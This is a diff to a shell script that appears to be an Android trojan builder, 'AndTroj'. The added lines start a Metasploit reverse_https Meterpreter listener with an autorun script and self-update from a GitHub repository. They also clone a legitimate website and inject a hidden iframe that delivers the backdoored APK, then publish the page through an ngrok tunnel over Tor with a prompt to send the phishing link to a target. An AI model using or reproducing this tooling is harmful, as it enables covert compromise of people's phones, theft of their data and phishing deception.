@@ -1,5 +1,5 @@
 #!/bin/zsh
-# v55
+# v65
 # ┌──(unk9vvn㉿avi)-[~]
 # └─$ sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $NoIP $APK $URL
 
@@ -13,6 +13,7 @@ WHITE="\u001b[37m"
 YELLOW="\u001b[33m"
 
 
+version = '65'
 TORRC=$(cat /etc/tor/torrc|grep -o "UseBridges 1")
 
 
@@ -30,6 +31,7 @@ ORGAPK='/tmp/original'
 PAYLOAD='/tmp/payload'
 OUTPUT=`echo $APK | cut -d "." -f 1`
 SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)
+LAN=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -v '169.*.*.*' | grep -v '192.168.56.*' | grep -v '192.168.236.*')
 
 
 
@@ -57,12 +59,22 @@ if [[ ! -f "/usr/bin/tor" || ! -f "/usr/bin/curl" || ! -f "/usr/local/bin/apktoo
 fi
 
 
+# Checking Update
+if [ "$(curl -s https://raw.githubusercontent.com/a9v8i/AndTroj/main/version)" != "$version" ]; then
+	echo -e "$GREEN [*]$YELLOW Updating new version...$YELLOW"
+	git clone https://github.com/a9v8i/AndTroj.git /tmp/AndTroj
+	cp -r /tmp/AndTroj/* .
+	rm -r /tmp/AndTroj
+	echo -e "$GREEN [*]$YELLOW Updated... Please Try Again Script$YELLOW"
+	exit
+fi
+
+
 # Config Tor
 if [ "$TORRC" != "UseBridges 1" ]; then
 	echo "
 UseBridges 1
 ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy managed
-
 Bridge obfs4 194.135.89.28:443 7E3C52E04355F0D925B5F493BEFB97D419B70D80 cert=B+XjD3L80HvQLjm/Rw+D5RRSsCjlO0jW9WvA4NR7ADPE4zXyPpp5jN2RgeRDuIas1xG1PA iat-mode=0
 Bridge obfs4 103.246.250.213:8042 30BBC628BAF0E1C6E5780A90B2954C9EF9A9792C cert=HUphhCSe3K+UQf1a4z7JB0jXpjIPQGEBIvyk2zwGoPMB/05qBrk8pY4CRSNfviRadyTyHQ iat-mode=0
 Bridge obfs4 185.162.248.147:10111 7207F204CC4E242688FFA252599E51DDA776C01D cert=e3LSXtFXpmAP5pcW2UgSMwi4QaOeRiFxzXj6v9FXpD8yjjZhtcO2PDwBx+vdx4Wb5W3yTw iat-mode=0" >> /etc/tor/torrc
@@ -326,6 +338,8 @@ download -r *" > /tmp/autoand.rc
 	echo -e "$GREEN [*]$YELLOW Generate Persistent$WHITE"
 	echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
 	echo -e "$GREEN [*]$YELLOW Forged Signatures$WHITE"
+	echo -e "$GREEN [*]$YELLOW Launching Msfconsole Listening$WHITE"
+	xfce4-terminal --tab --command 'msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' $NoIP ';set LPORT 8443;set ReverseListenerBindAddress ' $LAN ';set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"'
 }
 
 
@@ -339,7 +353,10 @@ function PHISHING()
 	mv "$OUTPUT-b.apk" /var/www/html/
 	wget -O /var/www/html/index.html -c -k -q -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "$URL"
 	sed -i "s#</body>#<iframe id='frame' src='$OUTPUT-b.apk' application='yes' width=0 height=0 style='hidden' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='$URL';}, 15000);</script>\n</body>#g" /var/www/html/index.html
-	proxychains ngrok http 80
+	proxychains ngrok http 80 > /dev/null
+	sleep 10
+	NGROK=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:\/\/([^"]*).*/\1/p')
+	echo -e "$GREEN [*]$YELLOW Send Phishing Link to TARGET: https://$NGROK$WHITE"
 }
 
 
